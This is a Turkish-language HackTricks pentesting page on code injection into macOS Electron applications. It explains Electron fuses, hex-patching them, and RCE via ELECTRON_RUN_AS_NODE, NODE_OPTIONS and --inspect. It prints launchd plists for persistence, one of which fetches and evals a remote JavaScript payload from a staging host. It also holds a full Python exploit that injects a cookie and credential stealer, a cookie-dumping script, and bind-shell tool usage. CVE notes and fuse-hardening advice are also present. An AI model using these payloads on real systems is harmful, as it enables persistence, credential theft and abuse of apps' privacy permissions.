# macOS Electron Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

## Temel Bilgiler

Electron'ın ne olduğunu bilmiyorsanız [**burada çok sayıda bilgi bulabilirsiniz**](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/electron-desktop-apps/index.html#rce-xss--contextisolation). Ancak şimdilik Electron'ın **node** çalıştırdığını bilmeniz yeterli.\
Node'da, belirtilen dosyanın yanı sıra **başka kodları çalıştırmasını sağlamak** için kullanılabilecek bazı **parametreler** ve **env değişkenleri** bulunur.

### Electron Fuses

Bu teknikler aşağıda ele alınacaktır, ancak son zamanlarda Electron bunları **önlemek için** çeşitli **security flag'leri** ekledi. Bunlar [**Electron Fuses**](https://www.electronjs.org/docs/latest/tutorial/fuses) olarak adlandırılır ve macOS'taki Electron uygulamalarının **arbitrary code yüklemesini önlemek** için kullanılanlar şunlardır:<sup>[[1]](#references)</sup>

- **`RunAsNode`**: Devre dışı bırakılırsa, kod enjekte etmek için **`ELECTRON_RUN_AS_NODE`** env var'ının kullanılmasını önler.
- **`EnableNodeCliInspectArguments`**: Devre dışı bırakılırsa, `--inspect` ve `--inspect-brk` gibi parametreler dikkate alınmaz. Böylece kod enjekte etme yöntemi engellenir.
- **`EnableEmbeddedAsarIntegrityValidation`**: Etkinleştirilirse, yüklenen **`asar`** **file** macOS tarafından **doğrulanır**. Böylece bu file'ın içeriğini değiştirerek **code injection** yapılması **önlenir**.
- **`OnlyLoadAppFromAsar`**: Etkinleştirilirse, yükleme için şu sırayla arama yapmak yerine: **`app.asar`**, **`app`** ve son olarak **`default_app.asar`**. Yalnızca app.asar'ı kontrol eder ve kullanır; böylece **`embeddedAsarIntegrityValidation`** fuse'u ile **birlikte kullanıldığında**, **doğrulanmamış kodun yüklenmesi** imkânsız hâle gelir.
- **`LoadBrowserProcessSpecificV8Snapshot`**: Etkinleştirilirse, browser process V8 snapshot'ı için `browser_v8_context_snapshot.bin` adlı file'ı kullanır.

Code injection'ı önlemeyen başka bir ilginç fuse ise:

- **EnableCookieEncryption**: Etkinleştirilirse, disk üzerindeki cookie store, OS level cryptography keys kullanılarak şifrelenir.

### Electron Fuses'ları Kontrol Etme

Bu flag'leri bir application üzerinden şu şekilde **kontrol edebilirsiniz**:
```bash
npx @electron/fuses read --app /Applications/Slack.app

Analyzing app: Slack.app
Fuse Version: v1
RunAsNode is Disabled
EnableCookieEncryption is Enabled
EnableNodeOptionsEnvironmentVariable is Disabled
EnableNodeCliInspectArguments is Disabled
EnableEmbeddedAsarIntegrityValidation is Enabled
OnlyLoadAppFromAsar is Enabled
LoadBrowserProcessSpecificV8Snapshot is Disabled
```
### Electron Fuses'ları Değiştirme

[**Belgelerde belirtildiği gibi**](https://www.electronjs.org/docs/latest/tutorial/fuses#runasnode), **Electron Fuses** yapılandırması, içinde bir yerde **`dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX`** dizesini barındıran **Electron binary** içinde yapılandırılır.<sup>[[1]](#references)</sup>

macOS uygulamalarında bu genellikle `application.app/Contents/Frameworks/Electron Framework.framework/Electron Framework` konumundadır.
```bash
grep -R "dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX" Slack.app/
Binary file Slack.app//Contents/Frameworks/Electron Framework.framework/Versions/A/Electron Framework matches
```
Bu dosyayı [https://hexed.it/](https://hexed.it/) üzerinde açıp önceki string'i arayabilirsiniz. Bu string'den sonra ASCII olarak, her fuse'un devre dışı mı yoksa etkin mi olduğunu belirten "0" veya "1" sayısını görebilirsiniz. **Fuse değerlerini değiştirmek** için hex kodunu (`0x30`, `0` ve `0x31`, `1` değeridir) değiştirmeniz yeterlidir.

<figure><img src="../../../images/image (34).png" alt=""><figcaption></figcaption></figure>

Bir uygulamanın içindeki **`Electron Framework` binary'sini**, bu byte'lar değiştirilmiş şekilde **overwrite** etmeye çalışırsanız uygulamanın çalışmayacağını unutmayın.

## Electron Applications'a kod ekleyerek RCE

Bir Electron App'in kullandığı **external JS/HTML files** bulunabilir. Bu nedenle saldırgan, signature kontrol edilmeyecek olan bu dosyalara kod inject edebilir ve uygulamanın bağlamında arbitrary code çalıştırabilir.

> [!CAUTION]
> Ancak şu anda 2 sınırlama bulunmaktadır:
>
> - Bir App'i değiştirmek için **`kTCCServiceSystemPolicyAppBundles`** izni **gereklidir**; dolayısıyla varsayılan olarak bu artık mümkün değildir.
> - Derlenmiş **`asap`** dosyasında genellikle **`embeddedAsarIntegrityValidation`** `and` **`onlyLoadAppFromAsar`** fuses'ları **etkindir**.
>
> Bu da bu attack path'i daha karmaşık (veya imkânsız) hâle getirir.

**`kTCCServiceSystemPolicyAppBundles`** gereksinimini, uygulamayı başka bir dizine (örneğin **`/tmp`**) kopyalayarak, **`app.app/Contents`** klasörünü **`app.app/NotCon`** olarak yeniden adlandırarak, **asar** dosyasını **malicious** kodunuzla **modifying** ederek, tekrar **`app.app/Contents`** olarak yeniden adlandırıp çalıştırarak bypass etmenin mümkün olduğunu unutmayın.<sup>[[5]](#references)</sup>

asar dosyasındaki kodu şu komutla unpack edebilirsiniz:
```bash
npx asar extract app.asar app-decomp
```
Ve değiştirdikten sonra şu komutla tekrar paketleyin:
```bash
npx asar pack app-decomp app-new.asar
```
## ELECTRON_RUN_AS_NODE ile RCE

[**belgelere**](https://www.electronjs.org/docs/latest/api/environment-variables#electron_run_as_node) göre bu env variable ayarlanırsa process normal bir Node.js process olarak başlatılır.<sup>[[6]](#references)</sup>
```bash
# Run this
ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
# Then from the nodeJS console execute:
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
```
> [!CAUTION]
> **`RunAsNode`** fuse'u devre dışı bırakılırsa **`ELECTRON_RUN_AS_NODE`** env var'ı yok sayılır ve bu çalışmaz.

### App Plist'inden Injection

[**Burada önerildiği gibi**](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks/), persistence sağlamak için bu env variable'ı bir plist içinde abuse edebilirsiniz:<sup>[[2]](#references)</sup>
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>EnvironmentVariables</key>
<dict>
<key>ELECTRON_RUN_AS_NODE</key>
<string>true</string>
</dict>
<key>Label</key>
<string>com.xpnsec.hideme</string>
<key>ProgramArguments</key>
<array>
<string>/Applications/Slack.app/Contents/MacOS/Slack</string>
<string>-e</string>
<string>const { spawn } = require("child_process"); spawn("osascript", ["-l","JavaScript","-e","eval(ObjC.unwrap($.NSString.alloc.initWithDataEncoding( $.NSData.dataWithContentsOfURL( $.NSURL.URLWithString('http://stagingserver/apfell.js')), $.NSUTF8StringEncoding)));"]);</string>
</array>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>
```
## `NODE_OPTIONS` ile RCE

Payload'u farklı bir dosyada saklayabilir ve çalıştırabilirsiniz:
```bash
# Content of /tmp/payload.js
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator');

# Execute
NODE_OPTIONS="--require /tmp/payload.js" ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
```
> [!CAUTION]
> **`EnableNodeOptionsEnvironmentVariable`** fuse'u **devre dışı** bırakılmışsa uygulama, **`ELECTRON_RUN_AS_NODE`** env variable'ı ayarlanmadığı sürece başlatıldığında **NODE_OPTIONS** env var'ını **yoksayar**; fuse **`RunAsNode`** devre dışı bırakılmışsa bu env variable da **yoksayılır**.
>
> **`ELECTRON_RUN_AS_NODE`** ayarlanmazsa şu **error** ile karşılaşırsınız: `Most NODE_OPTIONs are not supported in packaged apps. See documentation for more details.`

### App Plist'ten Injection

Bu env variable'ı bir plist içinde abuse ederek aşağıdaki key'leri ekleyip persistence sağlayabilirsiniz:
```xml
<dict>
<key>EnvironmentVariables</key>
<dict>
<key>ELECTRON_RUN_AS_NODE</key>
<string>true</string>
<key>NODE_OPTIONS</key>
<string>--require /tmp/payload.js</string>
</dict>
<key>Label</key>
<string>com.hacktricks.hideme</string>
<key>RunAtLoad</key>
<true/>
</dict>
```
## Inspect ile RCE

[**Burada**](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f) belirtildiği üzere, bir Electron uygulamasını **`--inspect`**, **`--inspect-brk`** ve **`--remote-debugging-port`** gibi flag'lerle çalıştırırsanız, bağlanabileceğiniz bir **debug port açılır** (örneğin Chrome'da `chrome://inspect` üzerinden) ve bu porta **code inject edebilir** veya hatta yeni process'ler başlatabilirsiniz.<sup>[[7]](#references)</sup>\
Örneğin:
```bash
/Applications/Signal.app/Contents/MacOS/Signal --inspect=9229
# Connect to it using chrome://inspect and execute a calculator with:
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
```
[**bu blog gönderisinde**](https://hackerone.com/reports/1274695), bu debugging, headless chrome'a **keyfi dosyaları keyfi konumlara indirtmek** için kötüye kullanılıyor.<sup>[[8]](#references)</sup>

> [!TIP]
> Bir uygulamanın env variables veya `--inspect` gibi parametrelerin ayarlanıp ayarlanmadığını kontrol etmek için kendine özgü bir yöntemi varsa, argüman olarak `--inspect-brk` kullanarak bunu runtime sırasında **bypass** etmeyi deneyebilirsiniz; bu, uygulamanın başlangıcında **çalıştırmayı durdurur** ve bir bypass işlemi gerçekleştirir (örneğin mevcut process'in argümanlarını veya env variables değerlerini üzerine yazarak).

Aşağıdaki exploit'te, uygulamayı `--inspect-brk` parametresiyle monitoring ve executing ederek sahip olduğu custom protection'ı bypass etmek ( `--inspect-brk` parametresini kaldırmak için process'in parametrelerinin üzerine yazmak) ve ardından uygulamadan cookies ve credentials dump etmek üzere bir JS payload inject etmek mümkün oluyordu:
```python
import asyncio
import websockets
import json
import requests
import os
import psutil
from time import sleep

INSPECT_URL = None
CONT = 0
CONTEXT_ID = None
NAME = None
UNIQUE_ID = None

JS_PAYLOADS = """
var { webContents } = require('electron');
var fs = require('fs');

var wc = webContents.getAllWebContents()[0]


function writeToFile(filePath, content) {
const data = typeof content === 'string' ? content : JSON.stringify(content, null, 2);

fs.writeFile(filePath, data, (err) => {
if (err) {
console.error(`Error writing to file ${filePath}:`, err);
} else {
console.log(`File written successfully at ${filePath}`);
}
});
}

function get_cookies() {
intervalIdCookies = setInterval(() => {
console.log("Checking cookies...");
wc.session.cookies.get({})
.then((cookies) => {
tokenCookie = cookies.find(cookie => cookie.name === "token");
if (tokenCookie){
writeToFile("/tmp/cookies.txt", cookies);
clearInterval(intervalIdCookies);
wc.executeJavaScript(`alert("Cookies stolen and written to /tmp/cookies.txt")`);
}
})
}, 1000);
}

function get_creds() {
in_location = false;
intervalIdCreds = setInterval(() => {
if (wc.mainFrame.url.includes("https://www.victim.com/account/login")) {
in_location = true;
console.log("Injecting creds logger...");
wc.executeJavaScript(`
(function() {
email = document.getElementById('login_email_id');
password = document.getElementById('login_password_id');
if (password && email) {
return email.value+":"+password.value;
}
})();
`).then(result => {
writeToFile("/tmp/victim_credentials.txt", result);
})
}
else if (in_location) {
wc.executeJavaScript(`alert("Creds stolen and written to /tmp/victim_credentials.txt")`);
clearInterval(intervalIdCreds);
}
}, 10); // Check every 10ms
setTimeout(() => clearInterval(intervalId), 20000); // Stop after 20 seconds
}

get_cookies();
get_creds();
console.log("Payloads injected");
"""

async def get_debugger_url():
"""
Fetch the local inspector's WebSocket URL from the JSON endpoint.
Assumes there's exactly one debug target.
"""
global INSPECT_URL

url = "http://127.0.0.1:9229/json"
response = requests.get(url)
data = response.json()
if not data:
raise RuntimeError("No debug targets found on port 9229.")
# data[0] should contain an object with "webSocketDebuggerUrl"
ws_url = data[0].get("webSocketDebuggerUrl")
if not ws_url:
raise RuntimeError("webSocketDebuggerUrl not found in inspector data.")
INSPECT_URL = ws_url


async def monitor_victim():
print("Monitoring victim process...")
found = False
while not found:
sleep(1)  # Check every second
for process in psutil.process_iter(attrs=['pid', 'name']):
try:
# Check if the process name contains "victim"
if process.info['name'] and 'victim' in process.info['name']:
found = True
print(f"Found victim process (PID: {process.info['pid']}). Terminating...")
os.kill(process.info['pid'], 9)  # Force kill the process
except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
# Handle processes that might have terminated or are inaccessible
pass
os.system("open /Applications/victim.app --args --inspect-brk")

async def bypass_protections():
global CONTEXT_ID, NAME, UNIQUE_ID
print(f"Connecting to {INSPECT_URL} ...")

async with websockets.connect(INSPECT_URL) as ws:
data = await send_cmd(ws, "Runtime.enable", get_first=True)
CONTEXT_ID = data["params"]["context"]["id"]
NAME = data["params"]["context"]["name"]
UNIQUE_ID = data["params"]["context"]["uniqueId"]

sleep(1)

await send_cmd(ws, "Debugger.enable", {"maxScriptsCacheSize": 10000000})

await send_cmd(ws, "Profiler.enable")

await send_cmd(ws, "Debugger.setBlackboxPatterns", {"patterns": ["/node_modules/|/browser_components/"], "skipAnonnymous": False})

await send_cmd(ws, "Runtime.runIfWaitingForDebugger")

await send_cmd(ws, "Runtime.executionContextCreated", get_first=False, params={"context": {"id": CONTEXT_ID, "origin": "", "name": NAME, "uniqueId": UNIQUE_ID, "auxData": {"isDefault": True}}})

code_to_inject = """process['argv'] = ['/Applications/victim.app/Contents/MacOS/victim']"""
await send_cmd(ws, "Runtime.evaluate", get_first=False, params={"expression": code_to_inject, "uniqueContextId":UNIQUE_ID})
print("Injected code to bypass protections")


async def js_payloads():
global CONT, CONTEXT_ID, NAME, UNIQUE_ID

print(f"Connecting to {INSPECT_URL} ...")

async with websockets.connect(INSPECT_URL) as ws:
data = await send_cmd(ws, "Runtime.enable", get_first=True)
CONTEXT_ID = data["params"]["context"]["id"]
NAME = data["params"]["context"]["name"]
UNIQUE_ID = data["params"]["context"]["uniqueId"]
await send_cmd(ws, "Runtime.compileScript", get_first=False, params={"expression":JS_PAYLOADS,"sourceURL":"","persistScript":False,"executionContextId":1})
await send_cmd(ws, "Runtime.evaluate", get_first=False, params={"expression":JS_PAYLOADS,"objectGroup":"console","includeCommandLineAPI":True,"silent":False,"returnByValue":False,"generatePreview":True,"userGesture":False,"awaitPromise":False,"replMode":True,"allowUnsafeEvalBlockedByCSP":True,"uniqueContextId":UNIQUE_ID})



async def main():
await monitor_victim()
sleep(3)
await get_debugger_url()
await bypass_protections()

sleep(7)

await js_payloads()



async def send_cmd(ws, method, get_first=False, params={}):
"""
Send a command to the inspector and read until we get a response with matching "id".
"""
global CONT

CONT += 1

# Send the command
await ws.send(json.dumps({"id": CONT, "method": method, "params": params}))
sleep(0.4)

# Read messages until we get our command result
while True:
response = await ws.recv()
data = json.loads(response)

# Print for debugging
print(f"[{method} / {CONT}] ->", data)

if get_first:
return data

# If this message is a response to our command (by matching "id"), break
if data.get("id") == CONT:
return data

# Otherwise it's an event or unrelated message; keep reading

if __name__ == "__main__":
asyncio.run(main())
```
> [!CAUTION]
> **`EnableNodeCliInspectArguments`** fuse'u devre dışı bırakılırsa uygulama, **`ELECTRON_RUN_AS_NODE`** env variable'ı ayarlanmadığı sürece başlatıldığında **`--inspect`** gibi node parametrelerini **yok sayar**. Fuse **`RunAsNode`** devre dışı bırakılmışsa env variable da **yok sayılır**.
>
> Ancak yine de **electron parametresi `--remote-debugging-port=9229`** kullanılabilir, fakat önceki payload diğer process'leri çalıştırmak için işe yaramaz.

**`--remote-debugging-port=9222`** parametresi kullanılarak Electron App'ten **history** (GET komutlarıyla) veya browser'ın **cookies**'leri gibi bazı bilgiler çalınabilir (bunlar browser içinde **decrypted** durumdadır ve bunları sağlayan bir **json endpoint** bulunur).

Bunu nasıl yapacağınızı [**buradan**](https://posts.specterops.io/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e) ve [**buradan**](https://slyd0g.medium.com/debugging-cookie-dumping-failures-with-chromiums-remote-debugger-8a4c4d19429f) öğrenebilir ve otomatik araç [WhiteChocolateMacademiaNut](https://github.com/slyd0g/WhiteChocolateMacademiaNut) veya aşağıdaki gibi basit bir script kullanabilirsiniz:<sup>[[9]](#references)[[10]](#references)</sup>
```python
import websocket
ws = websocket.WebSocket()
ws.connect("ws://localhost:9222/devtools/page/85976D59050BFEFDBA48204E3D865D00", suppress_origin=True)
ws.send('{\"id\": 1, \"method\": \"Network.getAllCookies\"}')
print(ws.recv()
```
### App Plist Üzerinden Injection

Persistence sağlamak için bir plist içindeki bu env variable'ı aşağıdaki key'leri ekleyerek abuse edebilirsiniz:
```xml
<dict>
<key>ProgramArguments</key>
<array>
<string>/Applications/Slack.app/Contents/MacOS/Slack</string>
<string>--inspect</string>
</array>
<key>Label</key>
<string>com.hacktricks.hideme</string>
<key>RunAtLoad</key>
<true/>
</dict>
```
## Daha Eski Sürümleri Kötüye Kullanarak TCC Bypass

> [!TIP]
> macOS'taki TCC daemon'u uygulamanın çalıştırılan sürümünü kontrol etmez. Bu nedenle, önceki tekniklerden herhangi biriyle **bir Electron uygulamasına code inject edemiyorsanız**, APP'nin önceki bir sürümünü indirip bu sürüme code inject edebilirsiniz; çünkü bu sürüm yine TCC ayrıcalıklarını alacaktır (Trust Cache bunu engellemediği sürece).

## JS Olmayan Code Çalıştırma

Önceki teknikler, **Electron uygulamasının process'i içinde JS code çalıştırmanıza** olanak tanır. Ancak **child process'lerin parent application ile aynı sandbox profile altında çalıştığını** ve parent application'ın TCC izinlerini **devraldığını** unutmayın.\
Bu nedenle, örneğin camera veya microphone'a erişmek için entitlements'ı kötüye kullanmak istiyorsanız, **process'ten başka bir binary çalıştırmanız** yeterlidir.

## Önemli Electron macOS Vulnerabilities (2023-2024)

### CVE-2023-44402 – ASAR integrity bypass

Electron ≤22.3.23 ve çeşitli 23-27 pre-release sürümleri, `.app/Contents/Resources` klasörüne write access sahibi bir attacker'ın `embeddedAsarIntegrityValidation` **ve** `onlyLoadAppFromAsar` fuses'larını bypass etmesine olanak tanıyordu. Bug, integrity checker'daki bir *file-type confusion* sorunuydu. Bu sorun, hazırlanmış **`app.asar` adlı bir directory'nin** doğrulanmış archive yerine yüklenmesine ve bu directory içine yerleştirilen herhangi bir JavaScript'in app başlatıldığında çalıştırılmasına olanak tanıyordu. Bu nedenle, hardening guidance'ı izleyip her iki fuse'u etkinleştirmiş vendor'lar bile macOS üzerinde hâlâ vulnerable durumdaydı.<sup>[[3]](#references)</sup>

Patched Electron sürümleri: **22.3.24**, **24.8.3**, **25.8.1**, **26.2.1** ve **27.0.0-alpha.7**. Daha eski bir build çalıştıran bir application bulan attacker'lar, application'ın TCC entitlements'larıyla code çalıştırmak için `Contents/Resources/app.asar` dosyasını kendi directory'leriyle overwrite edebilir.<sup>[[3]](#references)</sup>

### 2024 “RunAsNode” / “enableNodeCliInspectArguments” CVE cluster'ı

Ocak 2024'te bir dizi CVE (CVE-2024-23738 ile CVE-2024-23743 arası), birçok Electron app'in **RunAsNode** ve **EnableNodeCliInspectArguments** fuses'ları hâlâ etkin şekilde dağıtıldığını ortaya çıkardı. Bu nedenle local attacker, programı `ELECTRON_RUN_AS_NODE=1` environment variable'ı veya `--inspect-brk` gibi flag'lerle yeniden başlatarak programı *generic* bir Node.js process'ine dönüştürebilir ve application'ın sandbox ile TCC izinlerini devralabilir.<sup>[[4]](#references)</sup>

Electron ekibi “critical” derecelendirmesine itiraz etmiş ve attacker'ın zaten local code execution'a ihtiyaç duyduğunu belirtmiş olsa da bu issue, post-exploitation sırasında hâlâ değerlidir; çünkü vulnerable durumdaki herhangi bir Electron bundle'ını, örneğin desktop app'e daha önce verilmiş Contacts, Photos veya diğer sensitive resources'ları okuyabilen bir *living-off-the-land* binary'sine dönüştürür.<sup>[[4]](#references)</sup>

Electron maintainers tarafından sağlanan defensive guidance:<sup>[[4]](#references)</sup>

* Production build'lerinde `RunAsNode` ve `EnableNodeCliInspectArguments` fuses'larını disable edin.
* Application'ınızın meşru olarak bir helper Node.js process'ine ihtiyaç duyması durumunda, bu fuse'ları yeniden etkinleştirmek yerine daha yeni **UtilityProcess** API'sini kullanın.

## Automatic Injection

- [**electroniz3r**](https://github.com/r3ggi/electroniz3r)

[**electroniz3r**](https://github.com/r3ggi/electroniz3r) tool'u, yüklü **vulnerable electron applications'ı bulmak** ve bunlara code inject etmek için kolayca kullanılabilir. Bu tool, **`--inspect`** tekniğini kullanmayı deneyecektir:<sup>[[5]](#references)</sup>

Tool'u kendiniz compile etmeniz gerekir ve şu şekilde kullanabilirsiniz:
```bash
# Find electron apps
./electroniz3r list-apps

╔══════════════════════════════════════════════════════════════════════════════════════════════════════╗
║    Bundle identifier                      │       Path                                               ║
╚──────────────────────────────────────────────────────────────────────────────────────────────────────╝
com.microsoft.VSCode                         /Applications/Visual Studio Code.app
org.whispersystems.signal-desktop            /Applications/Signal.app
org.openvpn.client.app                       /Applications/OpenVPN Connect/OpenVPN Connect.app
com.neo4j.neo4j-desktop                      /Applications/Neo4j Desktop.app
com.electron.dockerdesktop                   /Applications/Docker.app/Contents/MacOS/Docker Desktop.app
org.openvpn.client.app                       /Applications/OpenVPN Connect/OpenVPN Connect.app
com.github.GitHubClient                      /Applications/GitHub Desktop.app
com.ledger.live                              /Applications/Ledger Live.app
com.postmanlabs.mac                          /Applications/Postman.app
com.tinyspeck.slackmacgap                    /Applications/Slack.app
com.hnc.Discord                              /Applications/Discord.app

# Check if an app has vulenrable fuses vulenrable
## It will check it by launching the app with the param "--inspect" and checking if the port opens
/electroniz3r verify "/Applications/Discord.app"

/Applications/Discord.app started the debug WebSocket server
The application is vulnerable!
You can now kill the app using `kill -9 57739`

# Get a shell inside discord
## For more precompiled-scripts check the code
./electroniz3r inject "/Applications/Discord.app" --predefined-script bindShell

/Applications/Discord.app started the debug WebSocket server
The webSocketDebuggerUrl is: ws://127.0.0.1:13337/8e0410f0-00e8-4e0e-92e4-58984daf37e5
Shell binding requested. Check `nc 127.0.0.1 12345`
```
- [https://github.com/boku7/Loki](https://github.com/boku7/Loki)

Loki, Electron uygulamalarının JavaScript dosyalarını Loki Command & Control JavaScript dosyalarıyla değiştirerek backdoor'lamak için tasarlanmıştır.

## References

- [1] [Electron Fuse'ları](https://www.electronjs.org/docs/latest/tutorial/fuses)
- [2] [Third-Party Framework'ler aracılığıyla MacOS Injection - TrustedSec](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks)
- [3] [Dosya türü karmaşası aracılığıyla ASAR Integrity bypass (GHSA-7m48-wc93-9g85)](https://github.com/electron/electron/security/advisories/GHSA-7m48-wc93-9g85)
- [4] ['runAsNode' CVE'leri hakkında açıklama - Electron](https://www.electronjs.org/blog/statement-run-as-node-cves)
- [5] [DEF CON 31 - ELECTRONizing macOS Privacy - Red Teaming cephaneliğinizde yeni bir silah - Wojciech Reguła](https://m.youtube.com/watch?v=VWQY5R2A6X8)
- [6] [Environment Variables | Electron](https://www.electronjs.org/docs/latest/api/environment-variables#electron_run_as_node)
- [7] [Electron uygulamaları sırlarınızı neden gizli tutamaz: --inspect seçeneği](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f)
- [8] [HackerOne Report #1274695 - Electron debugging ile arbitrary dosyalar indirme](https://hackerone.com/reports/1274695)
- [9] [Hands in the Cookie Jar: Chromium'un Remote Debugger Port'u ile Cookie'leri Dumping - SpecterOps](https://posts.specterops.io/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e)
- [10] [Chromium'un Remote Debugger'ı ile Cookie Dumping hatalarını Debugging - slyd0g](https://slyd0g.medium.com/debugging-cookie-dumping-failures-with-chromiums-remote-debugger-8a4c4d19429f)
{{#include ../../../banners/hacktricks-training.md}}
